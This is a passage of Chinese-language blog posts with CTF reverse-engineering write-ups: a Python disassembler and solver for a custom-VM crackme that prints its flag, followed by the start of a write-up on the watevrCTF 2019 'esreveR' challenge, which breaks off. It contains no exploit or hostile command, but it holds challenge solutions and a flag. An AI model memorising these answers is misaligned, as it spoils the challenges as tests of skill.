class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opcode)):</span><br><span class="line">	<span class="keyword">if</span> (opcode[i] == <span class="number">0xF1</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;mov &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE1</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;eax &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE2</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;ebx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE3</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;ecx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE4</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;eax&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE5</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;edx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE7</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;ebx&#x27;</span>)</span><br><span class="line">		i += <span class="number">6</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF2</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;xor eax ebx&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF5</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF4</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF7</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;mul eax edx&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF8</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;swap eax ebx&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF6</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;mov eax=3*eax+2*ebx+ecx&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read</span><br><span class="line">mov eax flag[0]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[32] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[33] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[34] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[35] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[36] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[37] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[38] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[39] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[40] eax</span><br><span class="line">mov eax flag[9]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[41] eax</span><br><span class="line">mov eax flag[10]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[42] eax</span><br><span class="line">mov eax flag[11]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[43] eax</span><br><span class="line">mov eax flag[12]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[44] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[45] eax</span><br><span class="line">mov eax flag[14]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[46] eax</span><br><span class="line">mov eax flag[15]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[47] eax</span><br><span class="line">mov eax flag[16]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[48] eax</span><br><span class="line">mov eax flag[17]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[49] eax</span><br><span class="line">mov eax flag[18]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[50] eax</span><br><span class="line">mov eax flag[19]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[51] eax</span><br><span class="line">nop</span><br><span class="line">read</span><br><span class="line">mov eax flag[0]</span><br><span class="line">mov ebx flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[0] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">mov ebx flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[1] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">mov ebx flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[2] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">mov ebx flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[3] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">mov ebx flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[4] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">mov ebx flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[5] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">mov ebx flag[7]</span><br><span class="line">mov ecx flag[8]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[6] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">mov ebx flag[8]</span><br><span class="line">mov ecx flag[9]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[7] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">mov ebx flag[9]</span><br><span class="line">mov ecx flag[10]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[8] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">mov ebx flag[19]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[13] eax</span><br><span class="line">mov flag[19] ebx</span><br><span class="line">mov eax flag[14]</span><br><span class="line">mov ebx flag[18]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[14] eax</span><br><span class="line">mov flag[18] ebx</span><br><span class="line">mov eax flag[15]</span><br><span class="line">mov ebx flag[17]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[15] eax</span><br><span class="line">mov flag[17] ebx</span><br><span class="line">nop</span><br></pre></td></tr></table></figure>

<p>第一段是假的，第二段是真的，逆向的得到真的flag的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>():</span><br><span class="line">    <span class="comment"># 1. 已知密文字节数组（来自题目.data段）</span></span><br><span class="line">    cipher = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>,</span><br><span class="line">              <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>,</span><br><span class="line">              <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 步骤1：反转交换操作（还原到乘法操作后的状态M）</span></span><br><span class="line">    <span class="comment"># 交换规则：M[13]=C[19], M[19]=C[13]; M[14]=C[18], M[18]=C[14]; M[15]=C[17], M[17]=C[15]</span></span><br><span class="line">    M = cipher.copy()</span><br><span class="line">    M[<span class="number">13</span>], M[<span class="number">19</span>] = M[<span class="number">19</span>], M[<span class="number">13</span>]</span><br><span class="line">    M[<span class="number">14</span>], M[<span class="number">18</span>] = M[<span class="number">18</span>], M[<span class="number">14</span>]</span><br><span class="line">    M[<span class="number">15</span>], M[<span class="number">17</span>] = M[<span class="number">17</span>], M[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 步骤2：求解乘法逆元，还原B[6]、B[7]、B[8]（即原始F[6]、F[7]、F[8]）</span></span><br><span class="line">    <span class="comment"># 已知条件：M[12] = 0x33 = 51（K），其模256逆元为251（提前计算得出）</span></span><br><span class="line">    K = M[<span class="number">12</span>]  <span class="comment"># 51</span></span><br><span class="line">    K_inv = <span class="number">251</span>  <span class="comment"># 51 mod 256的逆元</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算S6、S7、S8（乘法操作前的线性组合值）</span></span><br><span class="line">    S6 = (M[<span class="number">6</span>] * K_inv) % <span class="number">256</span>  <span class="comment"># M[6] = 0xC5 = 197</span></span><br><span class="line">    S7 = (M[<span class="number">7</span>] * K_inv) % <span class="number">256</span>  <span class="comment"># M[7] = 0x0B = 11</span></span><br><span class="line">    S8 = (M[<span class="number">8</span>] * K_inv) % <span class="number">256</span>  <span class="comment"># M[8] = 0x5C = 92</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 已知M[9] = 0x72 = 114，M[10] = 0x33 = 51（原始F[9]、F[10]）</span></span><br><span class="line">    F9 = M[<span class="number">9</span>]</span><br><span class="line">    F10 = M[<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解B[8]（F[8]）：3*F8 + 2*F9 + F10 ≡ S8 mod 256</span></span><br><span class="line">    <span class="comment"># 推导：3*F8 = S8 - (2*F9 + F10) mod 256 → F8 = (结果 * 3逆元) mod 256</span></span><br><span class="line">    inv3 = <span class="number">171</span>  <span class="comment"># 3 mod 256的逆元</span></span><br><span class="line">    temp8 = (S8 - (<span class="number">2</span> * F9 + F10)) % <span class="number">256</span></span><br><span class="line">    F8 = (temp8 * inv3) % <span class="number">256</span>  <span class="comment"># 结果：0x5F = 95</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解B[7]（F[7]）：3*F7 + 2*F8 + F9 ≡ S7 mod 256</span></span><br><span class="line">    temp7 = (S7 - (<span class="number">2</span> * F8 + F9)) % <span class="number">256</span></span><br><span class="line">    F7 = (temp7 * inv3) % <span class="number">256</span>  <span class="comment"># 结果：0x33 = 51</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解B[6]（F[6]）：3*F6 + 2*F7 + F8 ≡ S6 mod 256</span></span><br><span class="line">    temp6 = (S6 - (<span class="number">2</span> * F7 + F8)) % <span class="number">256</span></span><br><span class="line">    F6 = (temp6 * inv3) % <span class="number">256</span>  <span class="comment"># 结果：0x76 = 118</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 步骤3：逆向XOR链，还原F[0]~F[5]</span></span><br><span class="line">    <span class="comment"># 已知：B[0]~B[5] = M[0]~M[5]（XOR后的结果），F[6]已求出</span></span><br><span class="line">    B = M[:<span class="number">6</span>]  <span class="comment"># B[0]~B[5] = [0x69, 0x45, 0x2A, 0x37, 0x09, 0x17]</span></span><br><span class="line">    F = [<span class="number">0</span>] * <span class="number">20</span>  <span class="comment"># 原始flag数组（F[0]~F[19]）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先填充已知的F[6]~F[19]</span></span><br><span class="line">    F[<span class="number">6</span>] = F6</span><br><span class="line">    F[<span class="number">7</span>] = F7</span><br><span class="line">    F[<span class="number">8</span>] = F8</span><br><span class="line">    F[<span class="number">9</span>] = F9</span><br><span class="line">    F[<span class="number">10</span>] = F10</span><br><span class="line">    F[<span class="number">11</span>] = M[<span class="number">11</span>]  <span class="comment"># M[11] = 0x76 = 118（未被修改）</span></span><br><span class="line">    F[<span class="number">12</span>] = K  <span class="comment"># M[12] = 51（未被修改）</span></span><br><span class="line">    F[<span class="number">13</span>] = M[<span class="number">13</span>]  <span class="comment"># 反转交换后的值（原始F[13]）</span></span><br><span class="line">    F[<span class="number">14</span>] = M[<span class="number">14</span>]  <span class="comment"># 原始F[14]</span></span><br><span class="line">    F[<span class="number">15</span>] = M[<span class="number">15</span>]  <span class="comment"># 原始F[15]</span></span><br><span class="line">    F[<span class="number">16</span>] = M[<span class="number">16</span>]  <span class="comment"># M[16] = 0x5F = 95（未被修改）</span></span><br><span class="line">    F[<span class="number">17</span>] = M[<span class="number">17</span>]  <span class="comment"># 原始F[17]</span></span><br><span class="line">    F[<span class="number">18</span>] = M[<span class="number">18</span>]  <span class="comment"># 原始F[18]</span></span><br><span class="line">    F[<span class="number">19</span>] = M[<span class="number">19</span>]  <span class="comment"># 原始F[19]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逆向XOR链（从F[5]倒推到F[0]）</span></span><br><span class="line">    <span class="comment"># 公式：F[i] = B[i] ^ F[i+1]（因B[i] = F[i] ^ F[i+1]）</span></span><br><span class="line">    F[<span class="number">5</span>] = B[<span class="number">5</span>] ^ F[<span class="number">6</span>]  <span class="comment"># B[5] = 0x17 = 23</span></span><br><span class="line">    F[<span class="number">4</span>] = B[<span class="number">4</span>] ^ F[<span class="number">5</span>]  <span class="comment"># B[4] = 0x09 = 9</span></span><br><span class="line">    F[<span class="number">3</span>] = B[<span class="number">3</span>] ^ F[<span class="number">4</span>]  <span class="comment"># B[3] = 0x37 = 55</span></span><br><span class="line">    F[<span class="number">2</span>] = B[<span class="number">2</span>] ^ F[<span class="number">3</span>]  <span class="comment"># B[2] = 0x2A = 42</span></span><br><span class="line">    F[<span class="number">1</span>] = B[<span class="number">1</span>] ^ F[<span class="number">2</span>]  <span class="comment"># B[1] = 0x45 = 69</span></span><br><span class="line">    F[<span class="number">0</span>] = B[<span class="number">0</span>] ^ F[<span class="number">1</span>]  <span class="comment"># B[0] = 0x69 = 105</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 步骤4：转换为ASCII字符串，得到原始flag</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> F])</span><br><span class="line">    flag_hex = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;byte:02X&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> F])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原始flag（ASCII）：&quot;</span>, flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原始flag（十六进制）：&quot;</span>, flag_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt_flag()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y0u_hav3_r3v3rs3_1t!</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
        <category>vm逆向</category>
      </categories>
  </entry>
  <entry>
    <title>[watevrCTF 2019]esreveR</title>
    <url>/2025/01/25/watevrCTF-2019-esreveR/</url>
    <content><![CDATA[<h1 id="watevrCTF-2019-esreveR"><a href="#watevrCTF-2019-esreveR" class="headerlink" title="[watevrCTF 2019]esreveR"></a>[watevrCTF 2019]esreveR</h1><p>1.用IDA打开发现有问题，就放入010看了一下，发现ELF文件</p>
<ul>
<li>1.可以改后缀</li>
<li>2.可以选择IDA的打开方式</li>
</ul>
<p>2.打开后发现前的函数几乎都是类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return 2 * a1 + 3 * (a1 ^ 0x107503DE) - a1;</span><br></pre></td></tr></table></figure>

<p>的运算。<br>3.因此接着看到输入和判断的部分<br><img src="/2025/01/25/watevrCTF-2019-esreveR/1.png" alt="1"></p>
<p>再进入sub_55BAA98012D8<br>4.<img src="/2025/01/25/watevrCTF-2019-esreveR/2.png" alt="2"></p>
<p>再进入sub_55BAA9800BA0<br>5.<img src="/2025/01/25/watevrCTF-2019-esreveR/3.png" alt="3"></p>
<p>在linux上动调随便输入可以看到IDA中</p>
<p><img src="/2025/01/25/watevrCTF-2019-esreveR/4.png" alt="4"></p>
<p>6.将框里的(下面还有)提出来以字符串的形式输出</p>
